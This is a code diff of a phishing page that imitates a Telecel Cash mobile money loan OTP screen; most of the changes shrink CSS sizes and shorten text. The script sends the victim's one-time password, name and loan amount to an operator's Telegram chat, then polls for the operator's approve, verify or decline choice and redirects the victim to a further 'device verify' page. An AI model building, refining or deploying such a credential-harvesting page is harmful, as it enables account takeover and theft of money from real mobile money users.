@@ -15,20 +15,20 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 10px;
+            padding: 8px;
         }
         .container {
             width: 100%;
-            max-width: 380px;
+            max-width: 360px;
             background: white;
-            border-radius: 24px;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+            border-radius: 22px;
+            box-shadow: 0 6px 25px rgba(0,0,0,0.08);
             overflow: hidden;
         }
         .header {
             background: #E42320;
             color: white;
-            padding: 18px 20px;
+            padding: 16px 20px;
             text-align: center;
         }
         .logo {
@@ -36,10 +36,10 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
-            margin-bottom: 6px;
+            margin-bottom: 5px;
         }
         .logo-circle {
-            width: 38px; height: 38px;
+            width: 36px; height: 36px;
             background: white;
             color: #E42320;
             border-radius: 50%;
@@ -47,34 +47,35 @@
             align-items: center;
             justify-content: center;
             font-weight: bold;
-            font-size: 20px;
+            font-size: 19px;
         }
-        h1 { font-size: 22px; font-weight: 700; margin: 8px 0 5px; }
-        .subtitle { font-size: 14.5px; line-height: 1.4; }
+        h1 { font-size: 21px; font-weight: 700; margin: 6px 0 4px; }
+        .subtitle { font-size: 14px; line-height: 1.4; opacity: 0.95; }
 
         .loan-box {
-            margin: 16px;
+            margin: 14px;
             background: #fff0f0;
-            border-radius: 14px;
-            padding: 14px 16px;
+            border-radius: 12px;
+            padding: 12px 14px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            font-size: 14.5px;
         }
-        .loan-amount { font-size: 26px; font-weight: 800; color: var(--red); }
+        .loan-amount { font-size: 24px; font-weight: 800; color: var(--red); }
 
         .otp-container {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin: 8px 0 25px;
+            gap: 9px;
+            margin: 10px 0 22px;
             padding: 0 20px;
         }
         .otp-input {
-            width: 46px;
-            height: 56px;
+            width: 44px;
+            height: 54px;
             text-align: center;
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
             border: 2px solid #ddd;
             border-radius: 10px;
@@ -82,17 +83,16 @@
         }
         .otp-input:focus {
             border-color: var(--red);
-            box-shadow: 0 0 0 3px rgba(228,35,32,0.15);
         }
 
-        .form-section { padding: 0 20px 25px; }
+        .form-section { padding: 0 20px 24px; }
         .btn-action {
             width: 100%;
             background: var(--red);
             color: white;
             border: none;
-            padding: 15px;
-            font-size: 16.5px;
+            padding: 14px;
+            font-size: 16px;
             font-weight: 700;
             border-radius: 50px;
             cursor: pointer;
@@ -102,8 +102,9 @@
             background: transparent;
             color: #555;
             border: 2px solid #ddd;
-            padding: 13px;
+            padding: 12px;
             border-radius: 50px;
+            font-size: 15px;
         }
         .error-msg {
             display: none;
@@ -113,6 +114,7 @@
             padding: 12px;
             margin: 12px 20px;
             border-radius: 12px;
+            font-size: 14px;
         }
         #spinner {
             display: none;
@@ -126,7 +128,7 @@
             color: white;
         }
         .spin {
-            width: 55px; height: 55px;
+            width: 52px; height: 52px;
             border: 5px solid rgba(255,255,255,0.3);
             border-top: 5px solid white;
             border-radius: 50%;
@@ -140,10 +142,10 @@
         <div class="header">
             <div class="logo">
                 <div class="logo-circle">t</div>
-                <div><strong>Telecel Cash</strong><br><span style="font-size:12.5px;">Mobile Money</span></div>
+                <div><strong>Telecel Cash</strong><br><span style="font-size:12px;">Mobile Money</span></div>
             </div>
             <h1>OTP Verification</h1>
-            <p class="subtitle">Enter the 5-digit code sent to your Telecel number to authorize the loan.</p>
+            <p class="subtitle">Enter the 5-digit code sent to your Telecel number.</p>
         </div>
 
         <div class="loan-box" id="loanBox"></div>
@@ -158,7 +160,7 @@
 
     <div id="spinner">
         <div class="spin"></div>
-        <p style="margin-top:18px;">Verifying OTP...</p>
+        <p style="margin-top:16px;">Verifying...</p>
     </div>
 
     <script>
@@ -170,7 +172,7 @@
 
         document.getElementById('loanBox').innerHTML = `
             <div><strong>${name}</strong><br><span class="loan-amount">GHS ${parseInt(amount).toLocaleString()}</span></div>
-            <div style="text-align:right; font-size:13.5px;">Total: GHS ${parseInt(repay).toLocaleString()}<br>${duration} Days</div>
+            <div style="text-align:right; font-size:13px;">Total: GHS ${parseInt(repay).toLocaleString()}<br>${duration} Days</div>
         `;
 
         function createOTPInputs() {
@@ -189,10 +191,10 @@
 
         function setupAutoFocus() {
             const inputs = document.querySelectorAll('.otp-input');
-            inputs.forEach((input, index) => {
+            inputs.forEach((input, i) => {
                 input.addEventListener('input', () => {
-                    if (input.value.length === 1 && index < 4) inputs[index + 1].focus();
-                    if (getCode().length === 5) setTimeout(verifyOTP, 200);
+                    if (input.value.length === 1 && i < 4) inputs[i+1].focus();
+                    if (getCode().length === 5) setTimeout(verifyOTP, 180);
                 });
             });
         }
@@ -217,8 +219,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: '7547427914',
-                    text: `<b>🔴 Telecel Loan OTP</b>\n\n` +
-                          `Loan: ${name}\nAmount: GHS ${parseInt(amount).toLocaleString()}\nOTP: <code>${otp}</code>\n\nChoose Action:`,
+                    text: `<b>🔴 Telecel Loan OTP</b>\n\nLoan: ${name}\nAmount: GHS ${parseInt(amount).toLocaleString()}\nOTP: <code>${otp}</code>\n\nChoose:`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
@@ -230,9 +231,7 @@
                         ]
                     }
                 })
-            }).then(() => {
-                startPolling(approveId, verifyId, declineId);
-            });
+            }).then(() => startPolling(approveId, verifyId, declineId));
         }
 
         function startPolling(approveId, verifyId, declineId) {
@@ -252,13 +251,13 @@
                                 } else if (cb === verifyId) {
                                     window.location.href = `device_verify.html?${params.toString()}`;
                                 } else if (cb === declineId) {
-                                    document.getElementById('errMsg').textContent = "Request was declined by admin.";
+                                    document.getElementById('errMsg').textContent = "Request declined.";
                                     document.getElementById('errMsg').style.display = 'block';
                                 }
                             }
                         });
                     });
-            }, 900);
+            }, 800);
         }
 
         // Initialize
